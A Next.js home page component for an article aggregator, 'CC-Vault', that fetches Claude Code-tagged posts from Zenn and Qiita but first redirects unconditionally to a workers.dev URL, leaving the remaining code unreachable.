import { fetchHtmlDocument, fetchExternalData } from '@/lib/fetchers';
import { getZennTopicsData } from '@/lib/parser';
import { Article, QiitaPost } from '@/types';
import { convertToJstString } from '@/lib/utils';
import ArticleContainer from '@/components/ArticleContainer';
import { redirect } from 'next/navigation';

/**
 * ホームページコンポーネント (Server Component)
 * データ取得をサーバーサイドで実行し、結果をClient Componentに渡す
 */
export default async function HomePage() {
  const url =
    process.env.REDIRECT_API_YRL || 'https://cc-valut.ayasnppk00.workers.dev';

  redirect(url);
  // 並列処理で全データを取得
  const [zennData, qiitaData] = await Promise.all([
    // Zennのトピックスページから記事を取得
    (async () => {
      const zennTopicsUrl = `https://zenn.dev/topics/claudecode?order=latest`;

      const htmlString = await fetchHtmlDocument(zennTopicsUrl, {
        revalidate: 3600,
        tags: ['zenn-topics'],
      });

      return getZennTopicsData({ htmlString });
    })(),

    // QiitaのAPIから記事を取得
    (async () => {
      const qiitaData = await fetchExternalData<QiitaPost[]>(
        `https://qiita.com/api/v2/items?query=${encodeURIComponent('tag:claudecode')}`,
        {
          revalidate: 3600,
          tags: ['qiita-articles'],
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${process.env.QIITA_ACCESS_TOKEN}`,
          },
        },
      );

      return qiitaData;
    })(),
  ]);

  // 全記事を統合
  const allArticles: Article[] = [
    // Zennの記事
    ...zennData.articles.map((post) => ({
      id: `zenn-${post.id}`,
      title: post.title,
      url: `https://zenn.dev${post.path}`,
      author: post.author,
      publishedAt: convertToJstString(post.published_at),
      site: 'zenn' as const,
      engagement: {
        likes: post.likedCount,
        bookmarks: post.bookmarkedCount,
      },
    })),
    // Qiitaの記事
    ...qiitaData.map((post) => ({
      id: `qiita-${post.id}`,
      title: post.title,
      url: post.url,
      author: post.user.name || post.user.id, // ユーザー名が空の場合はIDを使用
      publishedAt: convertToJstString(post.created_at),
      site: 'qiita' as const,
      engagement: {
        likes: post.likes_count,
        bookmarks: post.stocks_count,
      },
    })),
  ];

  return (
    <div className='max-w-[80rem] mx-auto px-4 py-8'>
      <div className='pt-6 pb-8'>
        <h1 className='text-4xl md:text-6xl font-extrabold tracking-tight text-[#141413]'>
          CC-Vault
        </h1>
        <p className='mt-5 text-lg text-[#7D4A38]'>
          Claude Code中心の技術トレンドをまとめてチェック
        </p>
      </div>

      <ArticleContainer articles={allArticles} />
    </div>
  );
}
